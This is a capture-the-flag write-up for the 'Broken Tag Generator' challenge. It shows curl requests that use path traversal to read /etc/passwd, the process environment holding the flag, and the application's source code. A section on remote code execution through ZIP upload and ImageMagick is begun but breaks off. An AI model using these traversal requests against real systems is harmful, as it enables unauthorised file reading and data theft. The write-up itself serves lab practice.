# Objective 8: Broken Tag Generator

The objective is to obtain the value of the environment variable `GREETZ` of the [Tag Generator](https://tag-generator.kringlecastle.com/).

## Solution using Path Traversal

It was found that the image download function allows path traversal:
```
curl https://tag-generator.kringlecastle.com/image?id=../../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
[...]
```
Using this the value the environment variable can be obtained like this:
```
url https://tag-generator.kringlecastle.com/image?id=../../../../../proc/self/environ --output -
PATH=/usr/local/bundle/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOSTNAME=cbf2810b7573RUBY_MAJOR=2.7RUBY_VERSION=2.7.0RUBY_DOWNLOAD_SHA256=27d350a52a02b53034ca0794efe518667d558f152656c2baaf08f3d0c8b02343GEM_HOME=/usr/local/bundleBUNDLE_SILENCE_ROOT_WARNING=1BUNDLE_APP_CONFIG=/usr/local/bundleAPP_HOME=/appPORT=4141HOST=0.0.0.0GREETZ=JackFrostWasHereHOME=/home/app
```
So the `GREETZ` variable contains **JackFrostWasHere**

## Solution using RCE

The [Ruby application code](https://github.com/joergschwarzwaelder/hhc2020/blob/master/Objective-8/app.rb) can be downloaded through
```
curl https://tag-generator.kringlecastle.com/image?id=../../../../../app/lib/app.rb --output app.rb
```
This code allows to place uploaded files in a chosen place on the remote system using the ZIP upload function.
Furthermore the application starts the `convert` tool from  ImageMagick
<!--stackedit_data:
eyJoaXN0b3J5IjpbLTQ5NTA4NDE3MSwxOTMzMzYxNzg3LC0xND
Y3NjE1MjYyLC0yNDM5NDI4NjYsMTMxMjA1NjQ1Myw5MjA0NTU4
NjUsLTE2MDYwNzgwNDBdfQ==
-->